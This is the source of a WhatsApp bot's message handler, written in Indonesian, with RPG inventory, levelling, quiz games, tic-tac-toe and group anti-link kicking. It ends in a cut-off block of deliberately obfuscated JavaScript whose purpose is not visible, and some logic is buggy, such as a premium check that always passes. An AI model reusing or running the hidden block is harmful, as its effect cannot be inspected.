require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, Presence } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fetch = require("node-fetch")
const { mediafireDl } = require('./lib/mediafire.js')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const xfar = require('xfarr-api')
const FileType = require("file-type")
const { igDownloader } = require('./lib/igdown.js')
let { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction")


vn = false

//function rpg
   const { 
     addInventoriDarah, 
      cekDuluJoinAdaApaKagaDiJson, 
      addDarah, 
      kurangDarah, 
     getDarah 
   }  = require('./storage/user/darah.js')
   const { 
     cekInventoryAdaAtauGak, 
      addInventori,  
       addBesi, 
       addEmas, 
       addEmerald,
       addUmpan,
       addPotion,
       kurangBesi, 
       kurangEmas, 
       kurangEmerald, 
       kurangUmpan,
       kurangPotion,
       getBesi, 
      getEmas, 
     getEmerald,
     getUmpan,
    getPotion
   } = require('./storage/user/alat_tukar.js')
   const { 
    addInventoriMonay, 
    cekDuluJoinAdaApaKagaMonaynyaDiJson, 
    addMonay, 
    kurangMonay, 
   getMonay 
   } = require('./storage/user/monay.js')
   const { 
    addInventoriLimit, 
    cekDuluJoinAdaApaKagaLimitnyaDiJson, 
    addLimit, 
    kurangLimit, 
    getLimit 
   } = require('./storage/user/limit.js')
   const { 
    cekDuluHasilBuruanNya, 
     addInventoriBuruan, 
     addIkan,
      addAyam, 
      addKelinci, 
      addDomba, 
      addSapi,
      addGajah,
      kurangIkan,
      kurangAyam, 
      kurangKelinci, 
      kurangDomba, 
      kurangSapi,
      kurangGajah,
      getIkan,
      getAyam, 
      getKelinci, 
      getDomba,
     getSapi,
    getGajah
   } = require('./storage/user/buruan.js')
   let DarahAwal =  global.rpg.darahawal
   const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
   const isCekDarah = getDarah(m.sender)
   const isUmpan = getUmpan(m.sender)
   const isPotion = getPotion(m.sender)
   const isIkan = getIkan(m.sender)
   const isAyam = getAyam(m.sender)
   const isKelinci = getKelinci(m.sender)
   const isDomba = getDomba(m.sender)
   const isSapi = getSapi(m.sender)
   const isGajah = getGajah(m.sender)
   const isMonay = getMonay(m.sender)
   const isLimit = getLimit(m.sender)
   const isBesi = getBesi(m.sender)
   const isEmas = getEmas(m.sender)
   const isEmerald = getEmerald(m.sender)
   const isInventory = cekInventoryAdaAtauGak(m.sender)
   const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
   const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
   const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
   const ikan = ['🐟','🐠','🐡']   

//Levelling Bot
const levelRole = getLevelingLevel(m.sender)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 

/*        
//Fake Reply Group
	const reply = (teks) => {
            zaki.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./media/zaki.jpg`),"sourceUrl": "https://chat.whatsapp.com/E14rIyYMuovIfkskhi5QN9"}}}, { quoted: m})
        }
        
        const reply1 = (teks) => {
            zaki.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./media/zaki.jpg`),"sourceUrl": "https://m.youtube.com/channel/UCHIMODDER"}}}, { quoted: m})
        }
 */
 
 const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await zaki.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
zaki.sendMessage(from, buttonMessagesI, buttonsMessage, {
quoted: ftrol,
})
}


async function shortlink(url) {
isurl = /https?:\/\//.test(url)
return isurl ? (await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(url))).data : ''
}

const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
zaki.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
zaki.sendMessage(from, hasil, type, options).catch(e => {
zaki.sendMessage(from, { url : link }, type, options).catch(e => {
m.reply
console.log(e)
})
})
})
})
}
        	       	
// Database Rpg
     let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
 let _buruan = JSON.parse(fs.readFileSync('./storage/user/hasil_buruan.json'));
 let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/darah.json'))

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = zaki = async (zaki, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await zaki.decodeJid(zaki.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const from = mek.key.remoteJid

        // Group
        const groupMetadata = m.isGroup ? await zaki.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = m.sender || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false


const load = (text) => zaki.sendMessage(m.chat, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: 'Tunggu Sebenter Kak...', body: 'Orang Yang Sabar Di Sayang Aku', previewType:"PHOTO", thumbnail:pict, sourceUrl: 'https://youtube.com/c/UCHIMODDER' }}}, {quoted: m})
        
   /**
     * getBuffer hehe
     * @param {fs.PathLike} path
     * @param {Boolean} returnFilename
     */
    zaki.getFile = async (PATH, returnAsFilename) => {
        let res, filename
        const data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
        const type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        if (data && returnAsFilename && !filename) (filename = path.join(__dirname, './download/' + new Date * 1 + '.' + type.ext), await fs.promises.writeFile(filename, data))
        return {
            res,
            filename,
            ...type,
            data,
            deleteFile() {
                return filename && fs.promises.unlink(filename)
            }
        }
    }
    
    
    zaki.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
        let type = await zaki.getFile(path, true)
        let { res, data: file, filename: pathFile } = type
        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) } }
            catch (e) { if (e.json) throw e.json }
        }
        let opt = { filename }
        if (quoted) opt.quoted = quoted
        if (!type) options.asDocument = true
        let mtype = '', mimetype = type.mime, convert
        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
        else if (/video/.test(type.mime)) mtype = 'video'
        else if (/audio/.test(type.mime)) (
            convert = await (ptt ? toPTT : toAudio)(file, type.ext),
            file = convert.data,
            pathFile = convert.filename,
            mtype = 'audio',
            mimetype = 'audio/ogg; codecs=opus'
        )
        else mtype = 'document'
        if (options.asDocument) mtype = 'document'

        delete options.asSticker
        delete options.asLocation
        delete options.asVideo
        delete options.asDocument
        delete options.asImage

        let message = {
            ...options,
            caption,
            ptt,
            [mtype]: { url: pathFile },
            mimetype
        }
        let m
        try {
            m = await zaki.sendMessage(jid, message, { ...opt, ...options })
        } catch (e) {
            console.error(e)
            m = null
        } finally {
            if (!m) m = await zaki.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options })
            return m
        }
    }
		    
        // Memeg
        let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]
		
          try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!zaki.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            zaki.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
//Time
        moment.tz.setDefault("Asia/Jakarta").locale("id");

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await zaki.setStatus(`🤖 ${zaki.user.name} | ⏳ Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await zaki.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        zaki.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: zaki.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, zaki.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        zaki.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            zaki.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zaki.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zaki.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await zaki.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await zaki.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    zaki.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    zaki.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) zaki.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) zaki.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) zaki.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    zaki.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) zaki.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) zaki.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    zaki.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    //Dari SC zaki        
(function(_0x2b0bbc,_0x3377d7){function _0x577e20(_0x2bf5f5,_0x180914,_0x191d41,_0x148379){return _0x4faa(_0x180914- -0x1c7,_0x148379);}var _0x309ed7=_0x2b0bbc();function _0x21cf21(_0x2924b8,_0x11b73c,_0xc1564,_0x2165e2){return _0x4faa(_0x2165e2- -0x1c7,_0x2924b8);}while(!![]){try{var _0x4a887e=parseInt(_0x21cf21(0x47,0x35,0x18,0x24))/(0x2690+-0xbf*0x1+-0x25d0)+parseInt(_0x577e20(-0xf,-0x8,-0x8,-0x32))/(0x2*0xc17+0x245b+-0x3c87)+parseInt(_0x577e20(0x50,0x34,0x4,0x2f))/(-0xab9+-0x2*-0x8d8+-0x6f4)*(parseInt(_0x21cf21(-0x23,0x8,0x35,0xf))/(-0xed+0x9*-0x101+0x9fa))+parseInt(_0x577e20(0x4d,0x50,0x36,0x64))/(0x1bfa+0x1*0x2608+-0x41fd*0x1)+parseInt(_0x577e20(0x4b,0x3c,0xe,0x4d))/(-0x7c*0xb+0x3*0x925+0x1615*-0x1)*(-parseInt(_0x577e20(-0x2,0x28,0x44,0x44))/(-0x824+-0x89*-0x2+0x719))+-parseInt(_0x21cf21(0x10,0x5b,0x7,0x2f))/(0x4*0x9a+-0x18cb+-0x1*-0x166b)*(-parseInt(_0x577e20(0x6c,0x47,0x76,0x67))/(0x1a53+-0x1*-0x851+-0x229b))+parseInt(_0x21cf21(0x1e,0x47,0x5f,0x51))/(0x144c+0x1452+0x62*-0x6a)*(-parseInt(_0x577e20(0x36,0x1b,0x30,0x4b))/(-0x77*-0x35+-0x111*-0xf+-0x1*0x2897));if(_0x4a887e===_0x3377d7)break;else _0x309ed7['push'](_0x309ed7['shift']());}catch(_0x2af62b){_0x309ed7['push'](_0x309ed7['shift']());}}}(_0x5926,-0x1d*-0x3bcb+0x13*0x5341+-0x47a9b));function _0x5cbf04(_0x1991ea,_0x24e570,_0xc65d8b,_0x1c7697){return _0x4faa(_0x24e570- -0x34a,_0x1c7697);}var _0x5c1582=(function(){var _0x2372d1=!![];return function(_0x5817ca,_0x36ba83){var 